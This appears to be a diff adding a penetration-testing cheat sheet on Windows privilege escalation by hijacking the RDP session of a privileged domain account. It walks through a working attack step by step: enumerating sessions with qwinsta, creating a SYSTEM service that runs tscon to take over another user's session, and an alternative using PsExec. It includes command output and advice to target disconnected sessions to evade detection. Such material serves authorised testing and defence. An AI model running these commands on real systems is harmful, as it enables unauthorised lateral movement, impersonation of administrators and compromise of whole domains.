@@ -1,0 +1,94 @@
+========================================================================================================================
+Domain Privesc - Privilege escalation by hijacking the RDP session of a highly privileged Domain account
+========================================================================================================================
+
+The objectives of the RDP session hijacking technique is to hijack a legitimate user’s remote desktop session to:
+- move laterally within a Windows environment
+- escalate our privileges by hijacking the RDP session of a highly privileged Domain account (e.g., member of Domain Admin, 
+  Account Operators,...) 
+
+During a penetration test, if you obtain local administrator privileges over a remote Windows server or workstation, you 
+can use native Windows commands (i.e., 'c:\windows\system32\tscon.exe') to hijack the RDP remote session of any user 
+connected or disconnected on the target computer without knowing their password. 
+
+To limit the chance of being detected it is better to only target and hijack disconnected sessions. Indeed, if you hijack an 
+active session (i.e., session of a currently logged user), the victim user will be kick-out of his session and it will be 
+very suspicious.
+
+This technique allows to move laterally and escalate privileges by hijacking other privileged user sessions without the need 
+to know their passwords nor performing password attacks to impersonate them (i.e. no lssass memory dump, no pwd crack or PTH). 
+
+
+========================================================================================================================
+PoC/Basic example - RDP session hijacking using the native Windows command 'TSCON' 
+========================================================================================================================
+
+------------------------------------------------------------------------------------------------------------------------
+Step 1 - Enumerate the remote sessions available on a target Windows server for which you have local admin privileges
+------------------------------------------------------------------------------------------------------------------------
+
+In this example, we are logged with the domain account 'LAB\auditor' into a Windows laptop (member of the domain 'LAB').
+This account has local admin privileges over the remote Windows server '192.168.50.25' and thus can enumerate the 
+remote sessions available with the native Windows command 'qwinsta'.
+
+PS C:\Users\Auditor> qwinsta /server:192.168.50.25
+
+ SESSIONNAME           USERNAME           ID  STATE      TYPE   DEVICE
+ services                                  0  Disc        
+ console                                   1  Conn
+                       administrator       2  Disc            
+                       HelpdeskSupport     3  Disc            
+ rdp-tcp                               65536  Listen
+
+ > On the remote server there are 2 disconnected sessions:
+  +  the disconnected session ID 2 which belongs to the local account 'administrator'.
+  +  the disconnected session ID 3 which belongs to the the domain account 'HelpdeskSupport'.
+
+The domain account 'LAB\HelpdeskSupport' is a valuable target beacause it is member of the higly privileged domain group "Account Operators".
+
+
+------------------------------------------------------------------------------------------------------------------------
+Step 2 - Log into the remote Windows server '192.168.50.25' (RDP) with domain account auditor 'LAB\auditor' 
+------------------------------------------------------------------------------------------------------------------------
+
+Once logged, we can use locally the command 'query user' to confim the list of available sessions.
+
+C:\Users\Auditor> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>auditor               rdp-tcp#3           1  Active          .  11/19/2023 2:06 PM
+ administrator                             2  Disc            .  11/19/2023 2:04 PM
+ HelpdeskSupport                           3  Disc            .  11/18/2023 9:25 PM
+ 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Create & start a service that will execute TSCON with Local System level privileges & will hijack the session of the domain account 'LAB\HelpdeskSupport'
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Auditor> sc create svcrdpsessionhijack binpath="cmd.exe /k tscon 3 /dest:rdp-tcp#3"
+[SC] CreateService SUCCESS
+
+C:\Users\Auditor> net start svcrdpsessionhijack
+
+Result
+-------
+The attack worked !!
+> We have now full access to the RDP session of the higly privileged account 'LAB\HelpdeskSupport'.
+> We can impersonate him and (in our example) abuse the privileges of the domain group "Account Operators" to compromise the Windows domain.
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+Step 4 (Other attack) - Use PsExec to become Local System and then run TSCON to hijack the session of the local 'administrator' account
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Auditor\Desktop> PsExec64.exe -s -i cmd.exe
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32> tscon 2 /dest:rdp-tcp#3
+
+Result
+-------
+The attack worked !!
+> We have now full access to the RDP session of the local 'administrator' account.
